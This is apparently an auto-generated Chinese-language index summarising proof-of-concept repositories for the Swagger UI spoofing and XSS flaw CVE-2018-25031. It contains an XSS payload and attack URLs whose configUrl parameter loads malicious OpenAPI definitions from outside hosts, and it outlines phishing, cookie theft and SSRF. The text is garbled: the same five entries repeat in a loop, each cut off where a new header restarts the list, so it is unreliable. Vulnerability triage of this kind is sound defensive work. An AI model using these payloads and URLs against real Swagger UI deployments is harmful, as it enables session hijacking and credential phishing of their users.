4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
